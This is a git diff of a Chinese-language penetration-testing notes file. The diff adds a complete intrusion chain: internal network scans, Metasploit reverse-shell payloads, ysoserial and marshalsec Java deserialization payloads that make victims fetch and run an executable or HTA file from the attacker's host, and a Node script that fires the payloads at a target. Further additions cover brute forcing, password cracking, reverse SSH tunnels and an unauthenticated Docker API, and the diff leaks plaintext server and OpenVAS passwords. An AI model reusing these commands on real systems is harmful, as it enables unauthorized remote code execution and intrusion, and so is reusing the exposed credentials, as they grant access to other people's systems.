@@ -1,5 +1,7 @@
 # 渗透干货
-author: M.T.X. 2018-05-17 
+author: M.T.X. 2018-05-14 
+Twitter: @Hktalent3135773
+
 
 ## other awesome-macos-command-line
 ```
@@ -41,13 +43,14 @@ cat ok.txt|base64
 ```
 ipconfig getifaddr en0
 ipconfig getifaddr bridge0
+ip addr
 ```
 
 ## 参看特定端口进程、使用情况
 ```
 sudo lsof -i :5432
 ```
-## 查看进城信息
+## 查看进程信息
 ```
 codesign -vvvv -R="anchor apple" /usr/libexec/rapportd
 otool -L /usr/libexec/rapportd
@@ -126,7 +129,6 @@ ulimit -n 65535
 brew install nmap
 brew install masscan
 sudo port install arp-scan
-sudo masscan -p1099 --rate=1000 192.168.0.1/16
 ```
 
 ## 发现sniffer的人
@@ -276,8 +278,8 @@ gem install rubygems-update;update_rubygems
 ### jar安全溯源工具更新库
 ```
 sudo proxychains4 -f ~/pc.conf dependency-check  --updateonly
-cd /usr/local/Cellar/dependency-check/3.0.1/libexec/data/;
-/usr/local/Cellar/dependency-check/3.0.1/libexec/data/mycp;ls -la;ls -la /Volumes/mtx_hktalent/bak/
+cd /usr/local/Cellar/dependency-check/3.*/libexec/data/;
+/usr/local/Cellar/dependency-check/3.*/libexec/data/mycp;ls -la;ls -la /Volumes/mtx_hktalent/bak/
 295436288 Dec 27 10:32 dc.h2.db
 which dependency-check 
 /usr/local/bin/dependency-check
@@ -290,6 +292,7 @@ sh ~/npm-upgrade.sh
 npm update -g;npm -g outdated
 ```
 ### 修复metasploit的ruby环境
+
 ```
 sudo chmod go-w /usr/local/bin;sudo chmod 775 /usr/local;sudo chmod 775 /usr/local/bin;sudo chmod 775 /usr/local/ant;sudo chmod 775 /usr/local/ant/bin
 cd /Users/${xxx}/safe/metasploit-framework;rvm --default use 2.3.1;./msfupdate
@@ -299,11 +302,14 @@ env ARCHFLAGS="-arch x86_64" bundle install
 env ARCHFLAGS="-arch i386" gem install pg
 env ARCHFLAGS="-arch i386 -arch x86_64" gem install pg
 ```
+
 # java渗透，安全审计点滴
 ## 查找java进程
+
 ```
 lsof -i -P | grep java | grep LISTEN
 ```
+
 ## 找出没有使用SafeGene的java进程、jvm
 ```
 ps -ef | grep java | grep -v SafeGene.jar
@@ -315,13 +321,16 @@ ps -ef | grep jmxremote
 -Dcom.sun.management.jmxremote.authenticate=false
 -Dcom.sun.management.jmxremote.ssl=false
 ```
+
 注意：
 oracle的虚拟机会判断,如果你带上了这些参数,那么会在内部调用sun.management.Agent.premain
 属于Java SE的instrumentation技术.
 ## 查找root启动的java进程
+
 ```
 ps -ef -U root | grep java
 ```
+
 ## 查找动态sql
 ```
 find . -type f -name "*.xml" | xargs grep -n -E '\$[^\$]+\$'
@@ -707,8 +716,21 @@ help.findMe(
 2、方法二
 curl http://ipinfo.io/
 ```
-<!--
+
+
 # 一次简单的渗透
+## 端口扫描
+
+```
+sudo masscan -p1099 --rate=100000 192.168.0.1/16
+cat ips.txt |awk  '{print $6}'|xargs nmap -sV --script=exploit,external,vuln,auth,default -p 1099
+sudo masscan -p1098 --rate=100000 192.168.0.1/16
+cat ips.txt |awk  '{print $6}'|xargs nmap -sV --script=exploit,external,vuln,auth,default -p 1098
+
+nmap -p445 192.168.10.1/24 --script=/usr/local/share/nmap/scripts/ipidseq.nse
+sudo nmap -sV -p 1099 192.168.0.1/16 -Pn
+
+```
 ## 1、运行监听
 等待中招的机器连接回来
 
@@ -725,13 +747,29 @@ run -j -z
 
 ```
 cd /Users/`whoami`/safe/top20/metasploit-framework/
-./msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.24.10 LPORT=4445 -e x86/shikata_ga_nai -b '\x00' -i 8 -f exe -o /Users/`whoami`/safe/top20/metasploit-framework/tmp/2410_4445.exe
+./msfvenom -p windows/meterpreter_reverse_tcp LHOST=192.168.24.10 LPORT=4445 -e x86/shikata_ga_nai -b '\x00' -i 8 -f exe -o /Users/`whoami`/safe/top20/metasploit-framework/tmp/2410_4445.exe
+
+./msfvenom -p windows/meterpreter_reverse_tcp LHOST=192.168.24.10 LPORT=4445 -f exe -o /Users/`whoami`/safe/top20/metasploit-framework/tmp/2410_4445.exe
+
+
+use windows/misc/hta_server
+run -j -z
+
+那么远程执行代码
+mshta http://192.168.24.10:8080/WxtpFMT1WId.hta
+参考：
+https://github.com/redcanaryco/atomic-red-team
+https://github.com/Arno0x/PowerShellScripts
+DNS隧道
+https://github.com/Arno0x/DNSExfiltrator
+
 ```
 
 ## 3、监听http服务
 等待中招，存在漏洞的机器连接、下载、运行
 
 ```
+cd /Users/`whoami`/safe/top20/metasploit-framework/tmp
 cd tmp
 python -m SimpleHTTPServer 9999
 ```
@@ -746,9 +784,121 @@ cd myhktools
 
 java -jar jars/ysoserial-0.0.6-SNAPSHOT-all.jar BeanShell1 'cmd.exe /c del poc.vbs& del mess.exe& @echo Set objXMLHTTP=CreateObject("MSXML2.XMLHTTP")>poc.vbs&@echo objXMLHTTP.open "GET","http://192.168.24.10:9999/2410_4445.exe",false>>poc.vbs&@echo objXMLHTTP.send()>>poc.vbs&@echo If objXMLHTTP.Status=200 Then>>poc.vbs&@echo Set objADOStream=CreateObject("ADODB.Stream")>>poc.vbs&@echo objADOStream.Open>>poc.vbs&@echo objADOStream.Type=1 >>poc.vbs&@echo objADOStream.Write objXMLHTTP.ResponseBody>>poc.vbs&@echo objADOStream.Position=0 >>poc.vbs&@echo objADOStream.SaveToFile "mess.exe">>poc.vbs&@echo objADOStream.Close>>poc.vbs&@echo Set objADOStream=Nothing>>poc.vbs&@echo End if>>poc.vbs&@echo Set objXMLHTTP=Nothing>>poc.vbs&@echo Set objShell=CreateObject("WScript.Shell")>>poc.vbs&@echo objShell.Exec("mess.exe")>>poc.vbs&cscript.exe poc.vbs'
 
-java -cp jars/ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.RMIRegistryExploit 192.168.28.27 1099 CommonsCollections1 'cmd.exe /c del poc.vbs& del mess.exe& @echo Set objXMLHTTP=CreateObject("MSXML2.XMLHTTP")>poc.vbs&@echo objXMLHTTP.open "GET","http://192.168.24.10:9999/2410_4445.exe",false>>poc.vbs&@echo objXMLHTTP.send()>>poc.vbs&@echo If objXMLHTTP.Status=200 Then>>poc.vbs&@echo Set objADOStream=CreateObject("ADODB.Stream")>>poc.vbs&@echo objADOStream.Open>>poc.vbs&@echo objADOStream.Type=1 >>poc.vbs&@echo objADOStream.Write objXMLHTTP.ResponseBody>>poc.vbs&@echo objADOStream.Position=0 >>poc.vbs&@echo objADOStream.SaveToFile "mess.exe">>poc.vbs&@echo objADOStream.Close>>poc.vbs&@echo Set objADOStream=Nothing>>poc.vbs&@echo End if>>poc.vbs&@echo Set objXMLHTTP=Nothing>>poc.vbs&@echo Set objShell=CreateObject("WScript.Shell")>>poc.vbs&@echo objShell.Exec("mess.exe")>>poc.vbs&cscript.exe poc.vbs'
+生成各种java反序列化漏洞的攻击代码
+java -jar /Users/`whoami`/safe/myhktools/jars/ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections1 'mshta http://192.168.24.10:8080/WxtpFMT1WId.hta'>CommonsCollections1.bin
+java -jar /Users/`whoami`/safe/myhktools/jars/ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections2 'mshta http://192.168.24.10:8080/WxtpFMT1WId.hta'>CommonsCollections2.bin
+java -jar /Users/`whoami`/safe/myhktools/jars/ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections3 'mshta http://192.168.24.10:8080/WxtpFMT1WId.hta'>CommonsCollections3.bin
+java -jar /Users/`whoami`/safe/myhktools/jars/ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections4 'mshta http://192.168.24.10:8080/WxtpFMT1WId.hta'>CommonsCollections4.bin
+java -jar /Users/`whoami`/safe/myhktools/jars/ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections5 'mshta http://192.168.24.10:8080/WxtpFMT1WId.hta'>CommonsCollections5.bin
+java -jar /Users/`whoami`/safe/myhktools/jars/ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections6 'mshta http://192.168.24.10:8080/WxtpFMT1WId.hta'>CommonsCollections6.bin
+java -jar /Users/`whoami`/safe/myhktools/jars/ysoserial-0.0.6-SNAPSHOT-all.jar C3P0 'mshta http://192.168.24.10:8080/WxtpFMT1WId.hta' >C3P0.bin
+java -jar /Users/`whoami`/safe/myhktools/jars/ysoserial-0.0.6-SNAPSHOT-all.jar BeanShell1 'mshta http://192.168.24.10:8080/WxtpFMT1WId.hta' > BeanShell1.bin
+java -jar /Users/`whoami`/safe/myhktools/jars/ysoserial-0.0.6-SNAPSHOT-all.jar Clojure 'mshta http://192.168.24.10:8080/WxtpFMT1WId.hta' > Clojure.bin
+java -jar /Users/`whoami`/safe/myhktools/jars/ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1 'mshta http://192.168.24.10:8080/WxtpFMT1WId.hta' > CommonsBeanutils1
+java -jar /Users/`whoami`/safe/myhktools/jars/ysoserial-0.0.6-SNAPSHOT-all.jar Groovy1 'mshta http://192.168.24.10:8080/WxtpFMT1WId.hta' > Groovy1.bin
+java -jar /Users/`whoami`/safe/myhktools/jars/ysoserial-0.0.6-SNAPSHOT-all.jar Hibernate1 'mshta http://192.168.24.10:8080/WxtpFMT1WId.hta' > Hibernate1.bin
+java -jar /Users/`whoami`/safe/myhktools/jars/ysoserial-0.0.6-SNAPSHOT-all.jar Hibernate2 'mshta http://192.168.24.10:8080/WxtpFMT1WId.hta' > Hibernate2.bin
+java -jar /Users/`whoami`/safe/myhktools/jars/ysoserial-0.0.6-SNAPSHOT-all.jar JBossInterceptors1 'mshta http://192.168.24.10:8080/WxtpFMT1WId.hta' > JBossInterceptors1.bin
+java -jar /Users/`whoami`/safe/myhktools/jars/ysoserial-0.0.6-SNAPSHOT-all.jar JSON1 'mshta http://192.168.24.10:8080/WxtpFMT1WId.hta' > JSON1.bin
+java -jar /Users/`whoami`/safe/myhktools/jars/ysoserial-0.0.6-SNAPSHOT-all.jar JavassistWeld1 'mshta http://192.168.24.10:8080/WxtpFMT1WId.hta' > JavassistWeld1.bin
+java -jar /Users/`whoami`/safe/myhktools/jars/ysoserial-0.0.6-SNAPSHOT-all.jar Jdk7u21 'mshta http://192.168.24.10:8080/WxtpFMT1WId.hta' > Jdk7u21.bin
+java -jar /Users/`whoami`/safe/myhktools/jars/ysoserial-0.0.6-SNAPSHOT-all.jar MozillaRhino1 'mshta http://192.168.24.10:8080/WxtpFMT1WId.hta' > MozillaRhino1.bin
+java -jar /Users/`whoami`/safe/myhktools/jars/ysoserial-0.0.6-SNAPSHOT-all.jar Myfaces1 'mshta http://192.168.24.10:8080/WxtpFMT1WId.hta' > Myfaces1.bin
+java -jar /Users/`whoami`/safe/myhktools/jars/ysoserial-0.0.6-SNAPSHOT-all.jar Myfaces2 'mshta http://192.168.24.10:8080/WxtpFMT1WId.hta' > Myfaces2.bin
+java -jar /Users/`whoami`/safe/myhktools/jars/ysoserial-0.0.6-SNAPSHOT-all.jar ROME 'mshta http://192.168.24.10:8080/WxtpFMT1WId.hta' > ROME.bin
+java -jar /Users/`whoami`/safe/myhktools/jars/ysoserial-0.0.6-SNAPSHOT-all.jar Spring1 'mshta http://192.168.24.10:8080/WxtpFMT1WId.hta' > Spring1.bin
+java -jar /Users/`whoami`/safe/myhktools/jars/ysoserial-0.0.6-SNAPSHOT-all.jar Spring2 'mshta http://192.168.24.10:8080/WxtpFMT1WId.hta' > Spring2.bin
+
+
+var net = require('net'),
+	fs = require('fs'),
+	oTmp = {"port": 8088,"host":"192.168.10.70",timeout:5000},
+	szPath = "~/safe/top20/metasploit-framework/tmp/",
+	szHd = fs.readFileSync(szPath + "post.txt").toString();
+
+function fnSend(s)
+{
+	s = fs.readFileSync(szPath + s);
+	var client = net.createConnection(oTmp,function()
+	{
+		client.write(szHd.replace(/277/gmi, s.length + 1));
+		client.write(s);
+		// client.end();
+	});
+}	
+
+
+var a = "BeanShell1.bin,CommonsCollections6.bin,Jython1.bin,C3P0.bin,Groovy1.bin,MozillaRhino1.bin,Clojure.bin,Hibernate1.bin,Myfaces1.bin,CommonsCollections1.bin,Hibernate2.bin,Myfaces2.bin,CommonsCollections2.bin,JBossInterceptors1.bin,ROME.bin,CommonsCollections3.bin,JSON1.bin,Spring1.bin,CommonsCollections4.bin,JavassistWeld1.bin,Spring2.bin,CommonsCollections5.bin,Jdk7u21.bin".split(/[,]/);
+
+for(var k in a)
+{
+	console.log("start payload: " + a[k]);
+	fnSend(a[k]);
+}
+
+node  myapp/sd.js
+
 ```
--->
+
+# marshalsec反序列化
+https://github.com/mbechler/marshalsec
+## Marshaller
+```
+BlazeDSAMF(0|3|X)
+Hessian|Burlap
+Castor
+Jackson
+Java
+JsonIO
+JYAML
+Kryo
+KryoAltStrategy
+Red5AMF(0|3)
+SnakeYAML
+XStream
+YAMLBeans
+```
+Run a JNDI reference redirector service pointing to that codebase - two implementations are included: marshalsec.jndi.LDAPRefServer and RMIRefServer.
+```
+java -cp target/marshalsec-0.0.1-SNAPSHOT-all.jar marshalsec.jndi.(LDAP|RMI)RefServer <codebase>#<class> [<port>]
+```
+## GadgetType
+```
+    UnicastRef
+    UnicastRemoteObject
+    Groovy
+    SpringPropertyPathFactory
+    SpringPartiallyComparableAdvisorHolder
+    SpringAbstractBeanFactoryPointcutAdvisor
+    Rome
+    XBean
+    Resin
+    CommonsConfiguration
+    LazySearchEnumeration
+    BindingEnumeration
+    ServiceLoader
+    ImageIO
+    CommonsBeanutils
+    C3P0WrapperConnPool
+    C3P0RefDataSource
+    JdbcRowSet
+    ScriptEngine
+    Templates
+    ResourceGadget
+```
+## 命令
+```
+java -cp /Users/`whoami`/safe/myhktools/jars/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.JsonIO  Groovy 'mshta http://192.168.24.10:8080/WxtpFMT1WId.hta' > marshalsec_JsonIO_Groovy.txt
+
+java -cp /Users/`whoami`/safe/myhktools/jars/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.BlazeDSAMF0  SpringPropertyPathFactory 'mshta http://192.168.24.10:8080/WxtpFMT1WId.hta' > marshalsec_BlazeDSAMF0_SpringPropertyPathFactory.bin
+
+java -cp /Users/`whoami`/safe/myhktools/jars/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.BlazeDSAMF3
+Picked up JAVA_TOOL_OPTIONS: -Dfile.encoding=UTF-8
+No gadget type specified, available are [UnicastRef, SpringPropertyPathFactory, C3P0WrapperConnPool]
+
+java -cp /Users/`whoami`/safe/myhktools/jars/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.BlazeDSAMF3  SpringPropertyPathFactory 'mshta http://192.168.24.10:8080/WxtpFMT1WId.hta' > marshalsec_BlazeDSAMF3_SpringPropertyPathFactory.bin
+
+```
 
 ## 后渗透：http隧道
 
@@ -802,48 +952,6 @@ iptables -nL --line-number
 
 
 ```
-
-# 一次简单的渗透
-## 1、运行监听
-等待中招的机器连接回来
-
-```
-./msfconsole
-use exploit/multi/handler
-set payload windows/meterpreter_reverse_tcp
-set LHOST 0.0.0.0
-set LPORT       4445
-run -j -z
-```
-
-## 2、生成攻击代码
-
-```
-cd /Users/`whoami`/safe/top20/metasploit-framework/
-./msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.24.10 LPORT=4445 -e x86/shikata_ga_nai -b '\x00' -i 8 -f exe -o /Users/`whoami`/safe/top20/metasploit-framework/tmp/2410_4445.exe
-```
-
-## 3、监听http服务
-等待中招，存在漏洞的机器连接、下载、运行
-
-```
-cd tmp
-python -m SimpleHTTPServer 9999
-```
-
-## 4、发动攻击
-
-```
-mkdir /Users/`whoami`/safe/
-cd /Users/`whoami`/safe/
-git clone https://github.com/hktalent/myhktools.git myhktools
-cd myhktools
-
-java -jar jars/ysoserial-0.0.6-SNAPSHOT-all.jar BeanShell1 'cmd.exe /c del poc.vbs& del mess.exe& @echo Set objXMLHTTP=CreateObject("MSXML2.XMLHTTP")>poc.vbs&@echo objXMLHTTP.open "GET","http://192.168.24.10:9999/2410_4445.exe",false>>poc.vbs&@echo objXMLHTTP.send()>>poc.vbs&@echo If objXMLHTTP.Status=200 Then>>poc.vbs&@echo Set objADOStream=CreateObject("ADODB.Stream")>>poc.vbs&@echo objADOStream.Open>>poc.vbs&@echo objADOStream.Type=1 >>poc.vbs&@echo objADOStream.Write objXMLHTTP.ResponseBody>>poc.vbs&@echo objADOStream.Position=0 >>poc.vbs&@echo objADOStream.SaveToFile "mess.exe">>poc.vbs&@echo objADOStream.Close>>poc.vbs&@echo Set objADOStream=Nothing>>poc.vbs&@echo End if>>poc.vbs&@echo Set objXMLHTTP=Nothing>>poc.vbs&@echo Set objShell=CreateObject("WScript.Shell")>>poc.vbs&@echo objShell.Exec("mess.exe")>>poc.vbs&cscript.exe poc.vbs'
-
-java -cp jars/ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.RMIRegistryExploit 192.168.28.27 1099 CommonsCollections1 'cmd.exe /c del poc.vbs& del mess.exe& @echo Set objXMLHTTP=CreateObject("MSXML2.XMLHTTP")>poc.vbs&@echo objXMLHTTP.open "GET","http://192.168.24.10:9999/2410_4445.exe",false>>poc.vbs&@echo objXMLHTTP.send()>>poc.vbs&@echo If objXMLHTTP.Status=200 Then>>poc.vbs&@echo Set objADOStream=CreateObject("ADODB.Stream")>>poc.vbs&@echo objADOStream.Open>>poc.vbs&@echo objADOStream.Type=1 >>poc.vbs&@echo objADOStream.Write objXMLHTTP.ResponseBody>>poc.vbs&@echo objADOStream.Position=0 >>poc.vbs&@echo objADOStream.SaveToFile "mess.exe">>poc.vbs&@echo objADOStream.Close>>poc.vbs&@echo Set objADOStream=Nothing>>poc.vbs&@echo End if>>poc.vbs&@echo Set objXMLHTTP=Nothing>>poc.vbs&@echo Set objShell=CreateObject("WScript.Shell")>>poc.vbs&@echo objShell.Exec("mess.exe")>>poc.vbs&cscript.exe poc.vbs'
-```
-
 # 一行java代码实现超级逼格后门
 ```
 1、java、或jsp中添加
@@ -1040,3 +1148,964 @@ dnsmasq --interface=eth0 --bind-interfaces \
 --log-queries --log-facility=/var/log/dnsmasq-server.log
 ```
 
+
+# LKM Linux rootkit
+可怕的工具，也是学习防御、反rootkit的途径，就是掌握他
+```
+https://github.com/f0rb1dd3n/Reptile
+```
+
+# 端口转发实战
+
+```
+1、建立不允许登录的用户，固定ip的服务器65上建立不允许shell的用户
+a、建立用户
+adduser poser --disabled-login --no-create-home --shell=/bin/false
+b、修改密码
+passwd poser
+.***xxx#
+2、kali上运行映射22到外部固定ip主机，确保随时、有固定ip可连接
+ssh -N -R -f localhost:3322:172.17.1.2:22 poser@23.105.209.65 -p 29156
+
+如果在其他机器上运行，将172.17.1.2和22端口修改，例如：
+192.168.10.115:8081 ，这可以将本地网络中其他主机的服务转到远程服务器上的3322端口
+3、kaili ssh配置调整
+a、vi /etc/ssh/sshd_config
+GatewayPorts yes 
+AllowTcpForwarding yes
+# TCPKeepAlive no 
+# ClientAliveInterval 30
+# ClientAliveCountMax 100
+b、重启ssh
+/etc/init.d/ssh restart
+service sshd restart
+4、kali上的服务转到本机，输入的是kali的root密码
+将openvas 9392转到本机
+ssh -L 8999:172.17.1.2:9392 root@23.105.209.65 -p 3322
+
+公司kali服务器root密码172.17.1.2
+K';&&&%^&jl_
+
+
+https://127.0.0.1:8999/login/login.html
+openvas
+http://172.17.1.2
+admin/xtmt2018
+```
+
+# jar安全溯源工具更新库
+
+```
+sudo proxychains4 -f ~/pc.conf dependency-check  --updateonly
+cd /usr/local/Cellar/dependency-check/3.0.1/libexec/data/;
+/usr/local/Cellar/dependency-check/3.0.1/libexec/data/mycp;ls -la;ls -la /Volumes/mtx_hktalent/bak/
+295436288 Dec 27 10:32 dc.h2.db
+which dependency-check 
+/usr/local/bin/dependency-check
+```
+
+# java渗透，安全审计点滴
+## 查找java进程
+```
+lsof -i -P | grep java | grep LISTEN
+```
+## 找出没有使用SafeGene的java进程、jvm
+```
+ps -ef | grep java | grep -v SafeGene.jar
+```
+## 查找可能存在远程攻击漏洞的进程
+```
+ps -ef | grep jmxremote
+-Dcom.sun.management.jmxremote.port=9999
+-Dcom.sun.management.jmxremote.authenticate=false
+-Dcom.sun.management.jmxremote.ssl=false
+```
+注意：
+oracle的虚拟机会判断,如果你带上了这些参数,那么会在内部调用sun.management.Agent.premain
+属于Java SE的instrumentation技术.
+## 查找root启动的java进程
+```
+ps -ef -U root | grep java
+```
+## 查找动态sql
+```
+find . -type f -name "*.xml" | xargs grep -n -E '\$[^\$]+\$'
+find . -type f -name "*.class" | xargs grep -n -E 'selsql'
+```
+## 查找使用了javaagent技术的进程
+```
+ps -ef | grep "\-javaagent"
+```
+
+## 查看ip区域、ip经纬度
+```
+nmap -n --top-ports 1  --script ip-geolocation-geoplugin 123.125.114.144
+curl http://ipinfo.io/123.125.114.144
+curl ipinfo.io/123.125.114.144
+{
+  "ip": "123.125.114.144",
+  "hostname": "No Hostname",
+  "city": "Beijing",
+  "region": "Beijing",
+  "country": "CN",
+  "loc": "39.9289,116.3883",
+  "org": "AS4808 China Unicom Beijing Province Network"
+geoiplookup -d /opt/local/share/GeoIP -v -i -l  123.125.114.144
+nmap -n --top-ports 1 --script ip-geolocation-maxmind --script-args ip-geolocation.maxmind_db=/opt/local/share/GeoIP/GeoLiteCity-Blocks.csv 123.125.114.144
+```
+
+## 发现抓包模式的机器
+```
+nmap -sV --script=sniffer-detect 192.168.24.10
+Host script results:
+|_ sniffer-detect: Likely in promiscuous mode (tests: "11111111")
+```
+## 用nc进行文件传输
+#### 在客户端使用
+```
+nc -nv target_host target_port < file.txt
+```
+#### 在服务器端使用
+```
+nc -l port > file.txt
+```
+
+
+# 分享outline
+outline服务端基于docker真的时好思路，100M的系统，很小，不过这个东西我们只能把信任寄托Ta的良心/::D，笔记分享大家：
+## 安装outline server
+```
+bash -c "$(wget -qO- https://raw.githubusercontent.com/Jigsaw-Code/outline-server/master/src/server_manager/install_scripts/install_server.sh)"
+```
+
+## 遇到问题
+```
+Cannot connect to the Docker daemon at unix:///var/run/docker.sock. Is the docker daemon running?
+```
+### 解决
+```
+vi /lib/systemd/system/docker.service
+ExecStart=/usr/bin/dockerd -H tcp://0.0.0.0:2375
+vi /etc/init.d/docker
+DOCKER_OPTS="-H tcp://0.0.0.0:2375"
+```
+### 启动
+```
+/usr/bin/dockerd
+```
+#### 发现
+```
+/var/lib/docker/overlay2/7fdc575a46535e6aefc31f84df39478b165e3d86c91d39654dee25755145f686/diff/root/shadowbox/app/server/main.js
+/var/lib/docker/overlay2/271755c5551f2a41681584c0259333d1f2e36f37cbdcd3a390a853b5a6c8ef2e/merged/root/shadowbox/app/server/main.js
+/var/lib/docker/overlay2/271755c5551f2a41681584c0259333d1f2e36f37cbdcd3a390a853b5a6c8ef2e/merged/usr/local/lib/node_modules/npm/node_modules/libnpx/node_modules/dotenv/lib/main.js
+/var/lib/docker/overlay2/271755c5551f2a41681584c0259333d1f2e36f37cbdcd3a390a853b5a6c8ef2e/merged/usr/local/lib/node_modules/npm/node_modules/qrcode-terminal/lib/main.js
+/var/lib/docker/overlay2/f4ece2df0aae726c93876344135f1bb39d6442508e91ac224c2906eca4292b78/diff/usr/local/lib/node_modules/npm/node_modules/libnpx/node_modules/dotenv/lib/main.js
+/var/lib/docker/overlay2/f4ece2df0aae726c93876344135f1bb39d6442508e91ac224c2906eca4292b78/diff/usr/local/lib/node_modules/npm/node_modules/qrcode-terminal/lib/main.js
+```
+神奇的js一直运行中
+## 似乎需要node的支持(我的执行步骤如下)
+
+```
+wget https://nodejs.org/dist/v8.11.2/node-v8.11.2-linux-x64.tar.xz
+unxz node-v8.11.2-linux-x64.tar.xz 
+tar -xvf node-v8.11.2-linux-x64.tar 
+mv node-v8.11.2-linux-x64 /usr/local/
+cd  /usr/local/
+mv node-v8.11.2-linux-x64 node
+ln -s /usr/local/node/bin/node /usr/local/bin/node
+ln -s /usr/local/node/bin/npm /usr/local/bin/npm
+```
+
+
+# 网络流量监控
+```
+流模式视频查看扫描进度
+sudo nmap -v 192.168.1.0/24 | python py2gource.py -t nmap | tee parsed_nmap | gource --realtime --log-format custom - -1440x900 --bloom-intensity 0.3 -e 0.2 -i 120 --title "Nmap of 192.168.1.0/24"
+```
+
+vi tcpdump2gource.awk
+
+```
+#!/usr/bin/awk -f
+# Convert `tcpdump -ttnql` output into gource custom format
+{
+  timestamp=$1
+  sip=$2;
+  proto=$5;
+  dip=substr($4, 1,length($4)-1);
+  direction=$3;
+  type="";
+  match(dip, /[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+/)
+  dport=substr(dip,RLENGTH+2);
+  gsub(".[0-9]*$","",timestamp);
+  gsub(".[0-9]*$","",dip);
+  network=dip;
+  gsub(".[0-9]*$","",network);
+  gsub(".[0-9]*$","",sip);
+  printf("%s|%s|A|%s/%s.%s|#FF00ff\n",timestamp,sip,dip,dport,proto);
+  # fflush();
+}
+```
+### shell
+```
+brew install gource
+brew install tcpdump
+rm /usr/local/var/homebrew/linked/gource/share/gource/fonts/FreeSans.ttf
+ln -s /Library/Fonts/Songti.ttc /usr/local/var/homebrew/linked/gource/share/gource/fonts/FreeSans.ttf
+brew install coreutils
+cd /usr/local/bin
+sudo ln -s ../opt/coreutils/libexec/gnubin/stdbuf stdbuf
+
+echo >pflog.log
+echo ${rtpswd} | sudo -S tcpdump -ttnql -r pflog.log 'proto \tcp' or 'proto \udp' \
+| stdbuf -i0 -o0 -e0 awk -f tcpdump2gource.awk \
+| gource --multi-sampling --no-vsync --title "en0 activity" --key \
+  --realtime --highlight-users --highlight-dirs --user-friction 0.2 \
+  --user-scale 0.8 --log-format custom --disable-auto-rotate -i 0 -
+```
+
+# 反序列化漏洞
+```
+https://github.com/joaomatosf/jexboss
+https://github.com/Coalfire-Research/java-deserialization-exploits
+https://github.com/pedrib/PoC
+https://github.com/vulhub/vulhub
+```
+
+# Vulhub是一个面向大众的开源漏洞靶场
+Vulhub - Some Docker-Compose files for vulnerabilities environment
+
+Vulhub是一个面向大众的开源漏洞靶场，无需docker知识，简单执行两条命令即可编译、运行一个完整的漏洞靶场镜像。
+
+在ubuntu16.04下安装docker/docker-compose:
+https://github.com/vulhub/vulhub
+
+
+# pentest_compilation
+Compilation of commands, tips and scripts that helped me throughout Vulnhub, Hackthebox, OSCP and real scenarios
+https://github.com/adon90/pentest_compilation
+
+https://github.com/Arno0x/WebDavDelivery.git
+
+<a name="enumeration"></a><h2> Enumeration </h2>
+
+<a name="genumeration"></a><h3>Generic Enumeration</h3>
+
+- port fullscan
+
+- UDP scan
+
+
+<a name="httpenumeration"></a><h3> HTTP Enumeration</h3>
+
+- dirsearch big.txt -e sh,txt,htm,php,cgi,html,pl,bak,old
+
+- banner inspection
+
+- review source code
+
+- bruteforce with cewl-based dictionary
+
+- searchsploit look at versions properly
+
+- test all the paths with the exploits, mangle it
+
+- nmap --script vuln
+
+- nmap --script safe (ssl-cert, virtual hosts)
+
+- always incercept with Burp
+
+- nikto -h
+
+- LFI, RFI, SQL, RCE, XXE, SSRF injections
+
+- PUT method all directories
+
+- Change POST body encoding with Burp
+
+- Bruteforce parameter names
+
+- dirsearch with cookie once authenticated
+
+- download vulnerable application from exploit-db and examine it
+
+<a name="sshenumeration"></a><h3>SSH Enumeration</h3>
+
+- shellshock
+
+- bruteforce
+
+- user_enum
+
+- Debian OpenSSL Predictable PRNG
+
+<a name="smbenumeration"></a><h3>SMB Enumeration</h3>
+
+- nmap --script vuln
+
+- nmap --script smb*
+
+- nmap --script smb-enum-shares,smb-ls
+
+- enum4linux
+
+<a name="snmpenumeration"><h3> SNMP Enumeration</h3>
+
+- snmpcheck
+
+- snmpenum
+
+<a name="explotation"></a><h2> Explotation </h2>
+
+<a name="bof"></a><h3> BOF exploit-based </h3>
+
+- change shellcode
+
+- make sure all badchars are removed
+
+- read the exploit properly in case this makes changes in the shellcode
+
+- capture traffic with wireshark making sure the entire shellcode is transmited
+
+- run the exploit several times
+
+- make sure the JMP ESP matches OS and language
+
+
+<a name="weakcreds"></a><h3> Weak Credentials </h3>
+
+
+<a name="httpbrute"></a><b> HTTP Brute Force </b>
+
+- wfuzz POST
+
+```wfuzz --hc 404 -c -z list,admin -z file,/root/Documents/SecLists/Passwords/korelogic-password.txt -d "user=FUZZ&password=FUZ2Z" http://192.168.30.161/admin/index.php```
+
+- hydra POST
+
+```hydra 192.168.30.161 -s 80 http-form-post "/admin/index.php:user=^USER^&password=^PASS^:Moved Temporarily" -l admin -P /root/Documents/SecLists/Passwords/korelogic-password.txt -t 20```
+
+- wfuzz NTLM
+
+```wfuzz -c --ntlm "admin:FUZZ" -z file,/root/Documents/SecLists/Passwords/darkc0de.txt --hc 401 https://<ip>/api```
+
+- wfuzz Basic Auth through Proxy
+
+```wfuzz -c --hc 404,400,401 -z file,/root/Documents/Audits/ActivosProduban/names.txt -z file,/root/Documents/Audits/ActivosProduban/names.txt --basic "FUZZ:FUZ2Z" -p 127.0.0.1:8080 https://<ip>/api/v1/```
+
+
+<a name="passcrack"></a><b> Password Cracking </b>
+
+- zip
+
+`fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt file.zip `
+
+- /etc/shadow
+
+<pre>
+unshadow passwd shadow > passwords
+john --wordlist=/usr/share/wordlists/rockyou.txt passwords
+</pre>
+
+- keepass 
+
+<pre>
+keepass2john /root/Desktop/NewDatabase.kdb > file
+john -incremental:alpha -format=keepass file
+</pre>
+
+
+<a name="rce"></a><h2> RCE </h2>
+
+<a name="phprce"></a><h3>PHP RCE</h3>
+
+test: 
+
